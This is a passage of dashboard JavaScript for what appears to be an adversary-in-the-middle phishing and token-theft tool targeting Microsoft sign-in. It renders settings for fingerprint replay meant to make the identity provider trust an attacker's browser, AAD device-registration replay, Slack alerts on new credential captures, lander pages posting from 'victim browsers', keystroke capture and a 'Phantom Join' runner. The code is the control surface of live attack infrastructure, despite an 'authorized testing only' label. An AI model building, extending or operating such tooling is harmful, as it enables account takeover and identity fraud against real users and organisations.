  if(k==='mobile_emulation')return `<div class="config-row"><label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="off"${v==='off'?' selected':''}>Off (Desktop)</option><option value="phone_android"${v==='phone_android'?' selected':''}>Phone — Android (Pixel 8)</option><option value="phone_ios"${v==='phone_ios'?' selected':''}>Phone — iOS (iPhone 15)</option><option value="tablet_android"${v==='tablet_android'?' selected':''}>Tablet — Android</option><option value="tablet_android_edge"${v==='tablet_android_edge'?' selected':''}>Tablet — Android + Edge</option><option value="tablet_ios"${v==='tablet_ios'?' selected':''}>Tablet — iOS</option><option value="tablet_ios_edge"${v==='tablet_ios_edge'?' selected':''}>Tablet — iOS + Edge</option></select></div>`;
  if(typeof v==='boolean')return `<div class="config-row"><label>${label}</label><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label></div>`;
  if(typeof v==='number')return `<div class="config-row"><label>${label}</label><input class="cfg-input" type="number" value="${v}" onchange="cfgSet('${k}',Number(this.value))"></div>`;
  if(typeof v==='string')return `<div class="config-row"><label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(v)}" onchange="cfgSet('${k}',this.value)"></div>`;
  return '';
}
function _renderKeysInto(elId, keys, notes){
  const el=document.getElementById(elId);if(!el)return;
  el.innerHTML=keys.map(k=>{
    if(!(k in configCache))return '';
    const row=_cfgRowHtml(k,configCache[k]);
    const hint=notes&&notes[k]?`<div style="color:#78859b;font-size:12px;margin:-4px 0 6px 0">${notes[k]}</div>`:'';
    return row+hint;
  }).join('');
}
function renderBrowserConfig(){
  _renderKeysInto('browser-cfg',BROWSER_KEYS,{
    browser_type:'<b>edge</b> = Chromium with Edge UA (no msedge install needed). <b>edge-real</b> = native Microsoft Edge (requires edge install; unsupported on arm64 Linux). <b>chrome</b> = Chromium with Chrome UA. <b>firefox</b> = native Firefox engine (real Gecko, not a UA spoof — works on arm64 Linux, unlike edge-real).',
    browser_chrome:'Controls the :8091 viewer chrome. <b>full</b> shows the back/forward/reload/URL input + action buttons. <b>minimal</b> hides navigation but keeps paste/capture/close. <b>none</b> drops the entire bar so only the primary browser window is visible. A <code>?chrome=full|minimal|none</code> URL param overrides this per-session.',
    private_mode:'Open each Playwright session in an incognito context (no persisted cookies between sessions).',
    mobile_emulation:'Emulate a mobile device viewport + user agent.',
    ignore_ssl:'Ignore upstream certificate errors (useful behind Zscaler/corporate intercept).',
    goto_timeout:'Navigation timeout in milliseconds.',
    heartbeat_interval:'Idle heartbeat from Playwright → dashboard, in seconds.',
    screenshot_interval:'Delay between screenshot frames, in seconds (lower = smoother, higher = less CPU). Re-read every tick — change without restart.',
    screenshot_quality:'JPEG quality 1–100. 85 is visually clean and ~30% smaller than 100. Re-read every tick.',
    screenshot_dpr:'Device-pixel-ratio for desktop sessions. <b>2</b> renders at retina resolution so HiDPI screens see a sharp image; <b>1</b> is the legacy lower-bandwidth path. Mobile profiles ignore this and use their own baked-in DPR. Takes effect on the next session.',
    max_screenshots:'How many screenshots to keep per session on disk.',
  });
}
// FINGERPRINT_KEYS is declared above (alongside BROWSER_KEYS) so it's
// in scope when CATEGORIZED_KEYS hides them from the generic
// Configuration pane.
const _FINGERPRINT_GROUPS=[
  {title:'Replay (Playwright launch at :8091)',
   keys:['use_captured_fingerprint','fingerprint_match_engine','fingerprint_match_tls_proxy']},
  {title:'Active JS probe',
   keys:['device_probe_enabled']},
  {title:'Identity replay (AAD device registration)',
   keys:['allow_drs_replay']},
];
const _FINGERPRINT_NOTES={
  use_captured_fingerprint:
    'Replay the User-Agent + Sec-CH-UA-* client hints + Accept-Language captured from the user\'s real browser on :3128 when Playwright launches at :8091. Makes the IdP see the same device signature it already trusts. Off by default.',
  fingerprint_match_engine:
    '<b>Sub-knob of <code>use_captured_fingerprint</code>.</b> When the captured UA classifies as Firefox or Safari, Playwright launches <code>firefox</code>/<code>webkit</code> instead of Chromium so the JA3 matches the UA family. No effect when the parent toggle is off.',
  fingerprint_match_tls_proxy:
    '<b>Sub-knob of <code>use_captured_fingerprint</code>.</b> The :3128 auth proxy\'s upstream leg uses <code>curl_cffi</code> impersonation (chrome / firefox / safari / edge) so origins see a real-browser-shape Client Hello (JA3/JA4) instead of OpenSSL\'s. WebSocket upgrades and >50 MB responses bypass this path.',
  device_probe_enabled:
    'Allow the active JS-probe page to be served by :3128 when a Devices registration with <i>Active probe</i> mode is pending. Single-fire, 30-min TTL, sentinel callback consumed in-proxy (never reaches upstream). Default on.',
  allow_drs_replay:
    '<span style="color:#fca5a5">⚠ Mutates IdP state.</span> When on, the Flow Trace ⚡ button on a row carrying a DRS-scoped Bearer token can replay the device-registration POST against <code>enterpriseregistration.windows.net</code>. Requires <i>both</i> this flag AND a per-call confirm. Authorized testing only.',
};
// DRS-ready quick-start preset — flips every fingerprint/replay knob
// the DRS-register flow needs in one click, so the operator doesn't
// have to remember the four-toggle combo. The preset is "active" iff
// every key in `_DRS_READY_PRESET` matches the configCache state.
const _DRS_READY_PRESET = {
  use_captured_fingerprint: true,
  fingerprint_match_engine: true,
  fingerprint_match_tls_proxy: true,
  allow_drs_replay: true,
};
// DRS-token-yielding default login URLs. The DRS scope is driven by
// the *client* (Microsoft Authentication Broker, Intune CP, etc.) —
// these URLs land the user on a sign-in surface where one of those
// clients is the most likely one to actually request DRS scope.
// Operators with a tenant-specific known-good URL can still type
// their own; this dropdown is convenience, not a hard list.
const _DRS_LOGIN_PRESETS = [
  {url: 'https://login.microsoftonline.com/common/oauth2/deviceauth',
   label: 'Device Auth — common DRS-token surface'},
  {url: 'https://login.microsoftonline.com/common/DeviceAuthTls/reprocess',
   label: 'WAM device-onboarding (advanced)'},
  {url: 'https://microsoft.com/devicelogin',
   label: 'devicelogin — interactive code entry page'},
];
function _isDrsReadyActive(){
  for(const k of Object.keys(_DRS_READY_PRESET)){
    if(configCache[k]!==_DRS_READY_PRESET[k])return false;
  }
  return true;
}
function _renderDrsQuickStart(){
  const active=_isDrsReadyActive();
  const stateColor=active?'#86efac':'#fbbf24';
  const stateText=active?'✓ active':'⚠ not active';
  const currentUrl=configCache.default_login_url||'';
  const presetMatch=_DRS_LOGIN_PRESETS.find(s=>s.url===currentUrl);
  return `<div style="background:#0a0e15;border:1px solid #1e3a5f;border-radius:6px;padding:12px 14px;margin:0 0 14px">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
      <h3 style="font-size:13px;color:#7dd3fc;text-transform:uppercase;letter-spacing:1px;margin:0">Quick start: DRS-ready</h3>
      <span style="color:${stateColor};font-size:12px;margin-left:auto">${stateText}</span>
    </div>
    <div style="color:#94a3b8;font-size:12px;margin-bottom:10px;line-height:1.5">
      One-click flip the four knobs the DRS-register flow needs:
      <code>use_captured_fingerprint</code>, <code>fingerprint_match_engine</code>,
      <code>fingerprint_match_tls_proxy</code>, <code>allow_drs_replay</code>.
      Pair with a DRS-yielding default login URL below.
      <span style="color:#fca5a5"> ⚠ <code>allow_drs_replay</code> mutates AAD tenant state when the operator clicks ⚡ Register.</span>
    </div>
    <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">
      <button class="btn" style="padding:6px 14px;font-size:13px" onclick="applyDrsReadyDefaults()">${active?'Re-apply':'▶ Apply DRS-ready defaults'}</button>
      ${active?'<button class="btn btn-danger" style="padding:6px 14px;font-size:13px" onclick="resetDrsReadyDefaults()">Reset to off</button>':''}
    </div>
    <div>
      <div style="color:#94a3b8;font-size:12px;margin-bottom:4px">Default login URL (used for new <code>:8091</code> sessions):</div>
      <select class="cfg-input cfg-input-wide" onchange="setDrsLoginUrl(this.value)">
        <option value="">— Keep current: ${esc(currentUrl||'(unset)')} —</option>
        ${_DRS_LOGIN_PRESETS.map(s=>`<option value="${esc(s.url)}"${s.url===currentUrl?' selected':''}>${esc(s.label)}</option>`).join('')}
      </select>
      ${presetMatch?'':'<div style="color:#78859b;font-size:11px;margin-top:4px">Selecting a preset above overwrites <code>default_login_url</code>.</div>'}
    </div>
  </div>`;
}
function applyDrsReadyDefaults(){
  if(!confirm('Apply DRS-ready defaults?\\n\\nFlips ON:\\n  • use_captured_fingerprint\\n  • fingerprint_match_engine\\n  • fingerprint_match_tls_proxy\\n  • allow_drs_replay (mutates AAD tenant state when ⚡ Register is clicked)\\n\\nContinue?'))return;
  Object.assign(configCache,_DRS_READY_PRESET);
  send({cmd:'update_config',data:{..._DRS_READY_PRESET}});
  renderFingerprintConfig();
}
function resetDrsReadyDefaults(){
  if(!confirm('Reset all four DRS-ready knobs to OFF?'))return;
  const off={};
  for(const k of Object.keys(_DRS_READY_PRESET))off[k]=false;
  Object.assign(configCache,off);
  send({cmd:'update_config',data:off});
  renderFingerprintConfig();
}
function setDrsLoginUrl(url){
  if(!url)return;  // "keep current" sentinel
  configCache.default_login_url=url;
  send({cmd:'update_config',data:{default_login_url:url}});
  // Don't re-render — re-rendering would reset the dropdown's
  // open-state if the user is mid-pick. The state badge updates
  // next time they re-enter the tab.
}
function renderFingerprintConfig(){
  const el=document.getElementById('fingerprint-cfg');if(!el)return;
  let html=_renderDrsQuickStart();
  for(const g of _FINGERPRINT_GROUPS){
    html+=`<h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">${esc(g.title)}</h3>`;
    for(const k of g.keys){
      if(!(k in configCache))continue;
      html+=_cfgRowHtml(k,configCache[k]);
      const note=_FINGERPRINT_NOTES[k];
      if(note)html+=`<div style="color:#78859b;font-size:12px;margin:-4px 0 8px 8px">${note}</div>`;
    }
  }
  // Allowlist + summary card. Loaded async — placeholder while
  // /api/devices/fingerprint-summary fetches.
  html+=`<h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:18px 0 6px">Allowlisted body capture (<code>config/sites.yaml</code>)</h3>
    <div id="fp-bodycapture" style="font-size:13px;color:#94a3b8">Loading…</div>
    <div style="font-size:12px;color:#64748b;margin-top:6px">Edit <code>config/sites.yaml</code> or <code>$DATA_DIR/sites.yaml</code> → <code>globals.body_capture_hostnames</code>. Hot-reload (~1s, no restart).</div>
    <h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:18px 0 6px">Current state</h3>
    <div id="fp-state" style="font-size:13px;color:#cbd5e1">Loading…</div>`;
  el.innerHTML=html;
  apiFetch('/api/devices/fingerprint-summary').then(r=>r.json()).then(d=>{
    const bc=document.getElementById('fp-bodycapture');
    if(bc){
      const hosts=d.body_capture_hostnames||[];
      bc.innerHTML=hosts.length
        ? hosts.map(h=>`<div style="font-family:monospace;font-size:12px;padding:2px 0">• ${esc(h)}</div>`).join('')
        : '<i>(none)</i>';
    }
    const st=document.getElementById('fp-state');
    if(st){
      const fps=d.captured_fingerprints||[];
      const fpList=fps.length
        ? `<details style="margin-top:6px"><summary style="cursor:pointer;color:#7dd3fc">${fps.length} captured fingerprint${fps.length===1?'':'s'} — click to expand</summary>
            <div style="margin-top:6px;font-family:monospace;font-size:12px">${
              fps.map(f=>`<div style="padding:3px 6px;border-bottom:1px solid #1e293b">
                <span style="color:#94a3b8">${esc(f.hostname)}</span>
                ${f.family?`<span class="badge" style="background:#0c4a6e;color:#7dd3fc;padding:1px 6px;border-radius:3px;margin-left:6px;font-size:11px">${esc(f.family)}</span>`:''}
                ${f.hints?`<span style="color:#64748b;font-size:11px;margin-left:6px">${f.hints}h</span>`:''}
                <div style="color:#64748b;font-size:11px">${esc((f.ua||'').slice(0,140))}</div>
              </div>`).join('')
            }</div>
          </details>`
        : '<div style="color:#78859b">No fingerprints captured yet — browse a site through localhost:3128.</div>';
      st.innerHTML=`
        <div>${fpList}</div>
        <div style="margin-top:8px">${esc(String(d.device_profile_count||0))} device profile${d.device_profile_count===1?'':'s'} — see the <a href="#" onclick="switchTab('devices');return false" style="color:#7dd3fc">Devices</a> tab.</div>
        <div>${esc(String(d.drs_credential_count||0))} DRS credential${d.drs_credential_count===1?'':'s'} registered — list at <code>GET /api/devices/drs-credentials</code>.</div>
      `;
    }
  }).catch(err=>{
    const bc=document.getElementById('fp-bodycapture');
    if(bc)bc.innerHTML=`<span style="color:#f87171">Failed to load: ${esc(String(err))}</span>`;
  });
}
function renderLoggingConfig(){
  _renderKeysInto('logging-cfg',LOGGING_KEYS,{
    verbose:'Extra per-request / per-response detail in the log stream.',
    log_requests:'Log every HTTP request URL (noisy — use with Request Filter).',
    log_responses:'Log every HTTP response URL + status.',
    log_auth_headers:'Log Authorization / CSRF / Set-Cookie headers (redacted).',
    log_set_cookies:'Log Set-Cookie events explicitly.',
    log_console:'Capture browser console messages.',
    log_heartbeats:'Emit a HEARTBEAT log line every <code>heartbeat_interval</code> seconds per live session. Useful for confirming aliveness; turn off if it clutters All Logs.',
    log_to_file:'Append all events to a rotating file under <code>/data/logs/</code>.',
    mask_captured_input:'Mask keyboard capture values so they show as bullets instead of plaintext.',
  });
}
// ── Performance tab ──
const PERF_PRESETS={
  // Key=config key; value applied verbatim. Comments explain rationale.
  low: {
    // Fewer frames, more JPEG compression — cuts per-session CPU by ~40%.
    screenshot_interval: 1.0,      // was 0.3 (≈1 fps instead of 3)
    screenshot_quality:  55,       // was 100 (smaller frames, noticeably softer)
    max_screenshots:     30,       // keep less scrollback on disk
    heartbeat_interval:  30.0,     // chatter every 30 s instead of 10
    // Tighter log backlog + drop noisy URLs aggressively.
    ws_history_lines:    200,
    filter_noisy_requests: true,
  },
  balanced: {
    screenshot_interval: 0.3,
    screenshot_quality:  100,
    max_screenshots:     100,
    heartbeat_interval:  10.0,
    ws_history_lines:    500,
    filter_noisy_requests: true,
  },
  high: {
    screenshot_interval: 0.2,      // 5 fps
    screenshot_quality:  100,
    max_screenshots:     200,
    heartbeat_interval:  5.0,
    ws_history_lines:    2000,
    filter_noisy_requests: true,
  },
};

function applyPerfPreset(name){
  const p=PERF_PRESETS[name]; if(!p){alert('unknown preset: '+name);return}
  // Apply each key through cfgSet so the change persists and the backend
  // picks it up immediately.
  for(const[k,v]of Object.entries(p)){cfgSet(k,v)}
  // Re-render so the input rows reflect the new values.
  renderPerformance();
  const el=document.getElementById('perf-preset-summary');
  if(el){
    el.innerHTML=`<span style="color:#86efac">&#10003; Applied <b>${name}</b> — `+
      Object.keys(p).map(k=>esc(k)+'='+esc(String(p[k]))).join(' · ')+'</span>';
    setTimeout(()=>{if(el)el.innerHTML=''},6000);
  }
}

async function refreshPerfMetrics(){
  const el=document.getElementById('perf-metrics'); if(!el)return;
  el.textContent='loading…';
  try{
    const r=await apiFetch('/api/metrics');
    const m=await r.json();
    const bus=m.bus||{};
    const pool=m.pool;
    const rssMb=m.rss_bytes?(m.rss_bytes/1024/1024).toFixed(1):'n/a';
    let html='';
    html+=`<div><b>pid</b>          ${esc(String(m.pid))}</div>`;
    html+=`<div><b>rss</b>          ${rssMb} MB</div>`;
    html+=`<div><b>active_sessions</b> ${m.active_sessions}</div>`;
    html+=`<div style="margin-top:6px;color:#7dd3fc">bus</div>`;
    html+=`<div>  pushed        ${bus.pushed||0}</div>`;
    html+=`<div>  fanned_out    ${bus.fanned_out||0}</div>`;
    html+=`<div>  dropped       ${bus.dropped||0} ${(bus.dropped||0)>0?'<span style="color:#f87171">← slow subscriber(s)</span>':''}</div>`;
    html+=`<div>  subscribers   ${bus.subscribers||0}</div>`;
    html+=`<div>  log_buffer    ${bus.log_buffer_len||0} / 10000</div>`;
    if(pool){
      html+=`<div style="margin-top:6px;color:#7dd3fc">worker pool</div>`;
      html+=`<div>  workers       ${pool.workers.length} / ${pool.worker_count}</div>`;
      html+=`<div>  capacity      ${pool.capacity}/worker</div>`;
      const byWorker=(pool.workers||[]).map(w=>`  w${w.worker_id} pid=${w.pid} sessions=${w.sessions.length}`).join('<br>');
      if(byWorker)html+='<div>'+byWorker+'</div>';
    } else {
      html+=`<div style="margin-top:6px;color:#64748b">worker pool: disabled (workers_enabled=false)</div>`;
    }
    el.innerHTML=html;
  }catch(e){
    el.textContent='failed to fetch /api/metrics — is the dashboard running?';
  }
}

function renderPerformance(){
  _renderKeysInto('perf-cfg-stream', PERF_STREAM_KEYS, {
    screenshot_interval:'Delay between screenshot frames, in seconds. <b>Lower = smoother</b>, more CPU. 0.3 = 3 fps (balanced), 1.0 = 1 fps (low).',
    screenshot_quality:'JPEG quality 0–100. 100 = lossless PNG, smaller numbers compress more aggressively. ~60 is still readable and ~½ the bytes.',
    max_screenshots:'Per-session scrollback on disk before rotation.',
    heartbeat_interval:'Idle heartbeat from Playwright → dashboard, in seconds. Lower = faster stale-session detection, more chatter.',
    screenshot_low_fidelity_non_chromium:'<b>Default ON.</b> Firefox / WebKit (iPad Safari) sessions use a polling <code>page.screenshot()</code> loop instead of CDP screencast — each frame is a full-page paint + JPEG, so typing feels laggy on heavy pages. When on, the polling loop caps quality at 55 and clamps interval to ≥0.5s. Chromium sessions are unaffected (they use CDP screencast).',
  });
  _renderKeysInto('perf-cfg-dashboard', PERF_DASHBOARD_KEYS, {
    ws_history_lines:'Initial log-history size sent to each /ws/data subscriber on connect. <b>Smaller = faster first paint</b> with many dashboards.',
    filter_noisy_requests:'Drop telemetry / analytics / CDN beacons from the REQ/RESP log stream (match lives in <code>config/sites.yaml</code> → <code>globals.noisy_hosts</code>).',
  });
  _renderKeysInto('perf-cfg-pool', PERF_POOL_KEYS, {
    workers_enabled:'Split Playwright into a subprocess pool so one crashed browser doesn\'t take out the :8091 control plane. Takes effect on stack restart.',
    worker_count:'How many worker processes to spawn at boot.',
    worker_sessions_max:'Max concurrent Playwright sessions each worker hosts. Total cap = worker_count × worker_sessions_max.',
  });
  refreshPerfMetrics();
}

function renderSlackConfig(){
  _renderKeysInto('slack-cfg',SLACK_KEYS,{
    enable_slack_notifications:'Master on/off. Turn off to silence Slack entirely regardless of webhook config.',
    slack_keepalive_webhook:'Webhook URL for token validity alerts (expired / re-auth failed).',
    slack_capture_webhook:'Webhook URL for new credential captures (every new site/user).',
    slack_routine_webhook:'Low-priority channel for routine events (currently: captures/login-starts/keepalives where auto_login_email is unset, i.e. "unknown user"). Leave blank to send everything to the regular channels. Failure alerts always go to the keepalive/capture channels regardless.',
  });
}
// Section grouping for the catch-all Settings → Configuration pane.
// Order is the rendered order. Keys missing from configCache (or hidden
// by CATEGORIZED_KEYS / INTEGRATION_KEYS / special-cased excludes) are
// skipped; sections with zero rendered rows omit their header. A final
// "Other" section catches anything not assigned, so a newly-added key
// stays visible without code changes.
const CFG_SECTIONS=[
  {title:'Identity',keys:['auto_login_email']},
  {title:'Azure / ADO defaults',keys:['default_tenant_id','default_ado_org']},
  {title:'Default device profile',keys:['default_device_id']},
  {title:'MFA',keys:['prefer_push','mfa_dead_end_show_qr','mfa_dead_end_device_code_enabled','mfa_dead_end_device_code_url']},
  {title:'Post-login redirect',keys:['post_login_redirect_enabled','post_login_redirect_url','post_login_redirect_playwright_enabled','post_login_redirect_playwright_url']},
  {title:'Auth proxy / autostart',keys:['autostart_auth_proxy','autostart_auth_proxy_port','autostart_playwright_from_proxy','auto_login_wait_seconds','proxy_via_playwright']},
  {title:'Capture / Flow Trace',keys:['flow_trace_enabled']},
  {title:'External capture (POST /api/capture/external)',keys:['external_capture_token','external_capture_allowed_ips','external_capture_cors_origins']},
  {title:'Worker pool',keys:['workers_enabled','worker_count','worker_sessions_max']},
  {title:'Dashboard',keys:['ws_history_lines','filter_noisy_requests']},
  {title:'Logs',keys:['hide_session_id_in_logs']},
];
function _cfgSectionHeader(title){
  const h=document.createElement('h3');
  h.style.cssText='font-size:13px;color:#7dd3fc;text-transform:uppercase;letter-spacing:1.5px;margin:20px 0 6px;padding-bottom:4px;border-bottom:1px solid #1e3a5f';
  h.textContent=title;
  return h;
}
function _cfgSectionBody(){
  const d=document.createElement('div');
  d.style.cssText='padding-left:14px;border-left:1px solid #1e3a5f;margin-left:2px';
  return d;
}
function _cfgRowFor(k,v){
  const row=document.createElement('div');row.className='config-row';
  const label = k==='prefer_push' ? 'prefer push when password auth is not allowed' : k.replace(/_/g,' ');
  if(k==='browser_type'){row.innerHTML=`<label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="edge"${v==='edge'?' selected':''}>Edge (emulated)</option><option value="edge-real"${v==='edge-real'?' selected':''}>Edge (real)</option><option value="chrome"${v==='chrome'?' selected':''}>Chrome</option><option value="firefox"${v==='firefox'?' selected':''}>Firefox</option></select>`}
  else if(k==='mobile_emulation'){row.innerHTML=`<label>${label}</label><select class="cfg-input" style="width:auto" onchange="cfgSet('${k}',this.value)"><option value="off"${v==='off'?' selected':''}>Off (Desktop)</option><option value="phone_android"${v==='phone_android'?' selected':''}>Phone — Android (Pixel 8)</option><option value="phone_ios"${v==='phone_ios'?' selected':''}>Phone — iOS (iPhone 15)</option><option value="tablet_android"${v==='tablet_android'?' selected':''}>Tablet — Android (Galaxy Tab S8)</option><option value="tablet_android_edge"${v==='tablet_android_edge'?' selected':''}>Tablet — Android + Edge (Galaxy Tab S8)</option><option value="tablet_ios"${v==='tablet_ios'?' selected':''}>Tablet — iOS (iPad Air)</option><option value="tablet_ios_edge"${v==='tablet_ios_edge'?' selected':''}>Tablet — iOS + Edge (iPad Air)</option></select>`}
  else if(k==='default_device_id'){
    const safe=esc(v||'');
    row.innerHTML=`<label>${label}</label><select id="cfg-default-device" class="cfg-input cfg-input-wide" onchange="cfgSet('${k}',this.value)"><option value="">— No default (current behaviour) —</option>${safe?`<option value="${safe}" selected>${safe}</option>`:''}</select><div style="color:#78859b;font-size:12px;margin-top:4px">Applied to every <code>:8091</code> session that doesn't pass an explicit <code>?device_id=</code>. Pick a profile from the Devices tab; a deleted id silently falls through to "no profile".</div>`;
    setTimeout(_renderDefaultDeviceOptions,0);
  }
  else if(k==='external_capture_token'){
    const hint='Bearer token required on every POST. Empty disables the endpoint (returns 404). Also accepts <code>EXTERNAL_CAPTURE_TOKEN</code> env or <code>config/external_capture_token.txt</code>.';
    row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="password" autocomplete="off" value="${esc(v||'')}" onchange="cfgSet('${k}',this.value)"><div style="color:#78859b;font-size:12px;margin-top:4px">${hint}</div>`;
  }
  else if(k==='external_capture_allowed_ips'){
    const arr=Array.isArray(v)?v:[];
    const hint='Comma-separated IPs or CIDRs (e.g. <code>10.0.5.12, 192.168.4.0/24</code>). Loopback is always allowed; remote callers must be on this list. Leave blank for loopback-only.';
    row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(arr.join(', '))}" placeholder="loopback-only" onchange="cfgSet('${k}', this.value.split(',').map(s=>s.trim()).filter(Boolean))"><div style="color:#78859b;font-size:12px;margin-top:4px">${hint}</div>`;
  }
  else if(k==='external_capture_cors_origins'){
    const arr=Array.isArray(v)?v:[];
    const hint='Comma-separated origins (e.g. <code>https://lander.example.com, https://login-sso.example</code>) or <code>*</code> to allow any. Empty = no cross-origin POSTs (same-origin landers only). NOTE: cross-origin landers post from victim browsers, so <code>external_capture_allowed_ips</code> must also be broadened (often <code>0.0.0.0/0</code>).';
    row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(arr.join(', '))}" placeholder="same-origin only" onchange="cfgSet('${k}', this.value.split(',').map(s=>s.trim()).filter(Boolean))"><div style="color:#78859b;font-size:12px;margin-top:4px">${hint}</div>`;
  }
  else if(k==='default_ado_org'){
    row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(v||'')}" placeholder="blank = auto-discover" onchange="cfgSet('${k}',this.value.trim())"><div style="color:#78859b;font-size:12px;margin-top:4px">Pre-fills the <b>ADO org</b> field on every Captured Data → ADO PAT panel. Leave blank to auto-discover the account's org(s) via the vssps accounts API.</div>`;
  }
  else if(typeof v==='boolean')row.innerHTML=`<label>${label}</label><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label>`;
  else if(typeof v==='number')row.innerHTML=`<label>${label}</label><input class="cfg-input" type="number" value="${v}" onchange="cfgSet('${k}',Number(this.value))">`;
  else if(typeof v==='string')row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(v)}" onchange="cfgSet('${k}',this.value)">`;
  else return null;
  return row;
}
function renderConfig(){
  const el=document.getElementById('cfg');el.innerHTML='';
  const skip=k=>(
    k==='default_login_url'||k==='login_urls'||k==='noisy_extensions'||
    k.startsWith('upstream_proxy')||
    INTEGRATION_KEYS.has(k)||CATEGORIZED_KEYS.has(k)
  );
  const placed=new Set();
  for(const sec of CFG_SECTIONS){
    const rows=[];
    for(const k of sec.keys){
      if(!(k in configCache))continue;
      if(skip(k))continue;
      const row=_cfgRowFor(k,configCache[k]);
      if(!row)continue;
      rows.push(row);placed.add(k);
    }
    if(!rows.length)continue;
    el.appendChild(_cfgSectionHeader(sec.title));
    const body=_cfgSectionBody();
    for(const r of rows)body.appendChild(r);
    el.appendChild(body);
  }
  // Catch-all for keys not assigned to any section above.
  const otherRows=[];
  for(const[k,v]of Object.entries(configCache)){
    if(skip(k)||placed.has(k))continue;
    const row=_cfgRowFor(k,v);
    if(row)otherRows.push(row);
  }
  if(otherRows.length){
    el.appendChild(_cfgSectionHeader('Other'));
    const body=_cfgSectionBody();
    for(const r of otherRows)body.appendChild(r);
    el.appendChild(body);
  }
}
async function _renderDefaultDeviceOptions(){
  const sel=document.getElementById('cfg-default-device');
  if(!sel)return;
  const cur=configCache.default_device_id||'';
  const opts=[`<option value=""${cur===''?' selected':''}>— No default (current behaviour) —</option>`];
  try{
    const r=await apiFetch('/api/devices');
    const data=await r.json();
    const list=(data&&data.devices)||[];
    if(list.length){
      opts.push('<optgroup label="Device profiles">');
      let curMatched=false;
      for(const d of list){
        const id=d.id||'';
        const name=d.name||id;
        const isSel=id===cur;
        if(isSel)curMatched=true;
        opts.push(`<option value="${esc(id)}"${isSel?' selected':''}>${esc(name)}</option>`);
      }
      opts.push('</optgroup>');
      // If `cur` is set but doesn't match any current profile, keep
      // it visible as "(missing)" so the operator notices and clears
      // it intentionally rather than silently losing the value on
      // the next save.
      if(cur&&!curMatched){
        opts.push(`<option value="${esc(cur)}" selected>${esc(cur)} (missing — profile deleted)</option>`);
      }
    }else{
      opts.push('<option disabled>— No device profiles yet (Devices tab → register one) —</option>');
    }
  }catch(e){
    opts.push(`<option disabled>(failed to load: ${esc(String(e))})</option>`);
  }
  sel.innerHTML=opts.join('');
}
function renderPresets(){
  const el=document.getElementById('url-presets'),cur=configCache.default_login_url||'',urls=configCache.login_urls||[];
  el.innerHTML=urls.map((u,i)=>{let h;try{h=new URL(u).hostname.replace('www.','')}catch(e){h=u.slice(0,30)}
    return`<div style="display:flex;align-items:center;gap:2px;width:100%"><button class="preset-btn${cur===u?' active-preset':''}" style="flex:1;text-align:left" onclick="setDefaultUrl('${esc(u)}')">${esc(h)}</button><button style="background:none;border:none;color:#78859b;cursor:pointer;font-size:14px;padding:2px 4px" onclick="removeLoginUrl(${i})" title="Remove">&times;</button></div>`}).join('');
  el.innerHTML+=`<div style="width:100%;margin-top:6px;display:flex;gap:4px"><input id="add-url-input" class="cfg-input" style="flex:1" placeholder="https://example.com/login"><button class="btn" style="padding:3px 10px" onclick="addLoginUrl()">Add</button></div>`;
  el.innerHTML+=`<div style="width:100%;margin-top:4px"><input class="cfg-input" style="width:100%" value="${esc(cur)}" placeholder="Custom default URL" onchange="setDefaultUrl(this.value)"></div>`;
}
function addLoginUrl(){const inp=document.getElementById('add-url-input'),u=inp.value.trim();if(!u)return;if(!configCache.login_urls)configCache.login_urls=[];configCache.login_urls.push(u);send({cmd:'update_config',data:{login_urls:configCache.login_urls}});inp.value='';renderPresets()}
function removeLoginUrl(i){if(!configCache.login_urls)return;configCache.login_urls.splice(i,1);send({cmd:'update_config',data:{login_urls:configCache.login_urls}});renderPresets()}

// ── Phantom Join ──────────────────────────────────────────────
function renderPhantom(){
  // First entry into the tab: pull current run status so we can
  // restore-by-reconnect into an existing run started in another tab.
  apiFetch('/api/phantom/status').then(r=>r.json()).then(s=>{
    if(!s||!s.allow_phantom_join){
      document.getElementById('phantom-hint').innerHTML=
        '<span style="color:#fbbf24">Disabled — turn on <code>allow_phantom_join</code> in Settings → Configuration first.</span>';
      document.getElementById('phantom-run-btn').disabled=true;
      return;
    }
    document.getElementById('phantom-run-btn').disabled=false;
    if(s.running){
      document.getElementById('phantom-hint').textContent=
        'A run is already in progress (started '+new Date((s.started_at||0)*1000).toLocaleTimeString()+'). Open a fresh run after this one completes.';
      _phantomSetRunningUI(true);
      // Reconnect-and-tail isn't implemented at v0; the existing
      // operator's tab still has the live log. Show a stop button
      // here so this tab can at least cancel the run.
    }else{
      _phantomSetRunningUI(false);
    }
  }).catch(()=>{
    document.getElementById('phantom-hint').textContent='Could not reach /api/phantom/status.';
  });
}
function _phantomSetRunningUI(running){
  phantomRunning=running;
  document.getElementById('phantom-run-btn').style.display=running?'none':'';
  document.getElementById('phantom-stop-btn').style.display=running?'':'none';
  const pill=document.getElementById('phantom-status-pill');
  if(pill)pill.innerHTML=running
    ? '<span style="color:#fbbf24">⚡ running</span>'
    : '<span style="color:#78859b">idle</span>';
  // Re-render the tab bar so the badge updates.
  try{renderTabs()}catch(_){}
}
function _phantomLog(line, kind){
  phantomLogLines.push(line);
  if(phantomLogLines.length>5000)phantomLogLines.splice(0,phantomLogLines.length-5000);
  const el=document.getElementById('phantom-log');
  if(!el)return;
  const span=document.createElement('div');
  // Colorise based on phantom_join's marker prefixes — the runner
  // strips ANSI but keeps the [+]/[!]/[-]/[*] tokens.
  let color='#cbd5e1';
